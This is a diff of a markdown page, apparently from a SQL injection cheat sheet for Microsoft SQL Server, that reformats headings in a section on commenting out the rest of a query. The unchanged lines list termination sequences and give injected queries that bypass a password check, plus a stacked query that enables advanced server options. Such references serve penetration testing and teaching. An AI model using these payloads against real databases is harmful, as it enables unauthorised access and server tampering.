@@ -7,8 +7,6 @@ tags: ["basics", "syntax", "comments"]
 lastUpdated: 2025-03-15
 ---
 
-## Comment Out Query
-
 In SQL injection attacks, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. This technique is commonly known as "comment termination."
 
 In Microsoft SQL Server (MSSQL), you can use the following methods to comment out the rest of a query:
@@ -20,7 +18,7 @@ In Microsoft SQL Server (MSSQL), you can use the following methods to comment ou
 | Batch separator      | `;`       | Terminates the current statement                |
 | Nullbyte             | `%00`     | Application-layer string truncation (see notes) |
 
-### Examples
+## Examples
 
 ```sql
 -- Example 1: Using -- to comment out the rest of the query
@@ -33,7 +31,7 @@ SELECT * FROM Users WHERE username = 'admin'/* ' AND password = 'password' */
 SELECT * FROM Users WHERE username = 'admin'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 ```
 
-#### Example 4: Null byte truncation (application-layer, not SQL Server)
+### Example 4: Null byte truncation (application-layer, not SQL Server)
 
 The `%00` null byte is **not** a SQL Server comment — it exploits C-style string handling in certain application frameworks/drivers that treat null bytes as string terminators.
 
@@ -51,7 +49,7 @@ SELECT * FROM Users WHERE username = 'admin'' AND password = '...'
 
 This technique only works in specific environments (classic ASP, older PHP configurations, certain ODBC drivers). Modern frameworks typically pass the null byte through or reject it. See note 5 below for details.
 
-### Notes
+## Notes
 
 1. MSSQL requires a space or new line after the `--` comment syntax.
 2. In some cases, MSSQL ignores comment syntax in strings, so ensure that your injection point has proper quoting.
